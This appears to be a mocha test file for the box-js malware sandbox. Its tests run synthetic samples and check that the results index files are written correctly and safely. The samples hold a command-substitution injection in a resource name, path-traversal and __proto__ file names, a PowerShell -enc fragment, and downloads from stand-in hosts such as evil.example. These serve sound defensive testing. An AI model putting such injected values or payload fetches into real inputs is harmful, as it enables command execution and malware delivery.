/* eslint-env mocha */

// snippets.json and resources.json are maps keyed by file name (the snippet's or the
// dropped resource's uuid name in the results dir). simpleStringify used to coerce every
// object to an array by numeric index, so both were written as lists of nulls, and
// resources.json was written BEFORE the new resource was recorded, so it always lagged
// one entry behind. These run box-js end to end and read the files back.

const assert = require("assert");
const {execFileSync} = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const boxDir = path.join(__dirname, "..");

function runSample(source) {
	const work = fs.mkdtempSync(path.join(os.tmpdir(), "boxjs-index-"));
	const sample = path.join(work, "sample.js");
	fs.writeFileSync(sample, source);
	execFileSync(process.execPath, [path.join(boxDir, "run.js"), sample, `--output-dir=${work}`], {
		cwd: work,
		stdio: "ignore",
		timeout: 60000,
	});
	const results = path.join(work, "sample.js.results");
	const read = (name) => JSON.parse(fs.readFileSync(path.join(results, name), "utf8"));
	return {work, results, read};
}

function dropResource(text, target) {
	return `var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 2;
s.WriteText(${JSON.stringify(text)}); s.SaveToFile(${JSON.stringify(target)}, 2); s.Close();\n`;
}

describe("results index files", function() {
	this.timeout(90000);
	let run;
	before(function() {
		run = runSample(
			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
			"x.open(\"GET\", \"http://example.invalid/stage2.bin\", false); x.send();\n" +
			dropResource("first", "C:\\Users\\Public\\a.txt") +
			dropResource("second", "C:\\Users\\Public\\b.txt")
		);
	});
	after(function() {
		fs.rmSync(run.work, {recursive: true, force: true});
	});

	it("writes snippets.json as an object keyed by snippet file name", function() {
		const snippets = run.read("snippets.json");
		assert.ok(snippets && typeof snippets === "object" && !Array.isArray(snippets),
			`expected an object, got ${JSON.stringify(snippets)}`);
		const names = Object.keys(snippets);
		assert.ok(names.length >= 1, "no snippets recorded");
		for (const name of names) {
			assert.ok(snippets[name] && typeof snippets[name].as === "string",
				`snippet ${name} has no 'as': ${JSON.stringify(snippets[name])}`);
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
		}
	});

	it("writes resources.json keyed by resource name, including the last resource", function() {
		const resources = run.read("resources.json");
		assert.ok(resources && typeof resources === "object" && !Array.isArray(resources),
			`expected an object, got ${JSON.stringify(resources)}`);
		const paths = Object.values(resources).map((r) => r.path).sort();
		assert.deepStrictEqual(paths, ["C:\\Users\\Public\\a.txt", "C:\\Users\\Public\\b.txt"]);
		for (const [name, res] of Object.entries(resources)) {
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
			assert.match(res.sha256, /^[0-9a-f]{64}$/);
		}
	});

	it("still writes arrays (IOC.json, urls.json) as arrays", function() {
		assert.ok(Array.isArray(run.read("IOC.json")));
		assert.deepStrictEqual(run.read("urls.json"), ["http://example.invalid/stage2.bin"]);
	});
});

describe("array index files", function() {
	this.timeout(90000);

	it("keeps every element when one is a function", function() {
		// copyWithoutCircularReferences drops function values, so bounding the copy by the
		// surviving key count cut the LAST element: urls.json lost the real URL.
		const run = runSample(
			"InstallProduct(function(){return 1;});\n" +
			"InstallProduct(\"http://evil.example/payload.exe\");\n"
		);
		try {
			const urls = run.read("urls.json");
			assert.ok(Array.isArray(urls));
			assert.ok(urls.includes("http://evil.example/payload.exe"), JSON.stringify(urls));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("index file hardening", function() {
	this.timeout(90000);

	it("keeps nested arrays as arrays", function() {
		const run = runSample("lib.logIOC(\"Probe\", {args: [\"-nop\", \"-enc\", \"SQBFAFgA\"]}, \"probe\");\n");
		try {
			const probe = run.read("IOC.json").find((e) => e.type === "Probe");
			assert.ok(probe, "no Probe IOC");
			assert.deepStrictEqual(probe.value.args, ["-nop", "-enc", "SQBFAFgA"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("lists only string URLs in urls.json, String objects included", function() {
		const run = runSample(
			"InstallProduct(function(){return 1;});\n" +
			"InstallProduct(\"http://first.example/a.exe\");\n" +
			"InstallProduct(new String(\" http://second.example/b.exe \"));\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"),
				["http://first.example/a.exe", "http://second.example/b.exe"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("does not pass a resource name through a shell", function() {
		const run = runSample("lib.logResource(\"$(touch${IFS}PWNED_file_cmd)\", \"C:\\\\x.txt\", \"hello\");\n");
		try {
			// runSample runs box-js in run.work, where an injected `touch` would land.
			assert.ok(!fs.existsSync(path.join(run.work, "PWNED_file_cmd")), "command substitution ran");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("sparse arrays", function() {
	this.timeout(90000);

	it("does not materialize a huge sparse array", function() {
		const run = runSample("var a = []; a[4294967294] = \"x\"; lib.logSnippet(\"s.js\", {as: a}, \"\");\n");
		try {
			assert.deepStrictEqual(run.read("snippets.json")["s.js"], {as: {"4294967294": "x"}});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("hostile names and shapes", function() {
	this.timeout(90000);

	it("keeps a non-string URL out of latestUrl", function() {
		const run = runSample(
			"InstallProduct(\"http://x.example/a.exe\");\n" +
			"InstallProduct(function(){return 1;});\n" +
			"lib.logResource(\"r1\", \"C:\\\\x.txt\", \"hello\");\n"
		);
		try {
			assert.strictEqual(run.read("resources.json").r1.latestUrl, "http://x.example/a.exe");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("records a resource and a snippet named __proto__", function() {
		const run = runSample(
			"lib.logResource(\"__proto__\", \"C:\\\\hidden.txt\", \"hello\");\n" +
			"lib.logSnippet(\"__proto__\", {as: \"x\"}, \"\");\n"
		);
		try {
			const resources = run.read("resources.json");
			assert.ok(Object.prototype.hasOwnProperty.call(resources, "__proto__"), JSON.stringify(resources));
			const snippets = run.read("snippets.json");
			assert.ok(Object.prototype.hasOwnProperty.call(snippets, "__proto__"), JSON.stringify(snippets));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("keeps trailing slots and extra array properties", function() {
		const run = runSample(
			"lib.logIOC(\"Trail\", {args: [\"a\", function(){}]}, \"t\");\n" +
			"var a = []; a[2] = \"z\"; a.p = 1; a.q = 2;\n" +
			"lib.logIOC(\"Extra\", {v: a}, \"e\");\n"
		);
		try {
			const iocs = run.read("IOC.json");
			assert.deepStrictEqual(iocs.find((e) => e.type === "Trail").value.args, ["a", null]);
			assert.deepStrictEqual(iocs.find((e) => e.type === "Extra").value.v, {"2": "z", p: 1, q: 2});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("sample-chosen file names", function() {
	this.timeout(90000);

	it("cannot overwrite an index file or leave the results dir", function() {
		const run = runSample(
			"lib.logResource(\"resources.json\", \"C:\\\\a.exe\", \"MZpayload\");\n" +
			"lib.logResource(\"../escaped.txt\", \"C:\\\\b.txt\", \"out\");\n" +
			"lib.logSnippet(\"IOC.json\", {as: \"x\"}, \"clobber\");\n"
		);
		try {
			const resources = run.read("resources.json");
			assert.ok(!Array.isArray(resources) && typeof resources === "object");
			const paths = Object.values(resources).map((r) => r.path).sort();
			assert.deepStrictEqual(paths, ["C:\\a.exe", "C:\\b.txt"]);
			assert.ok(!fs.existsSync(path.join(run.work, "escaped.txt")), "wrote outside the results dir");
			assert.ok(Array.isArray(run.read("IOC.json")), "IOC.json clobbered");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("survives a String whose toStringTag getter throws, and an unprintable URL", function() {
		const run = runSample(
			"var u = new String(\"http://evil.example/p\");\n" +
			"Object.defineProperty(u, Symbol.toStringTag, {get: function(){ throw new Error(\"stop\"); }});\n" +
			"InstallProduct(u);\n" +
			"InstallProduct({toString: function(){ throw new Error(\"boom\"); }});\n" +
			"InstallProduct(\"http://after.example/q\");\n"
		);
		try {
			assert.ok(run.read("urls.json").includes("http://after.example/q"));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});
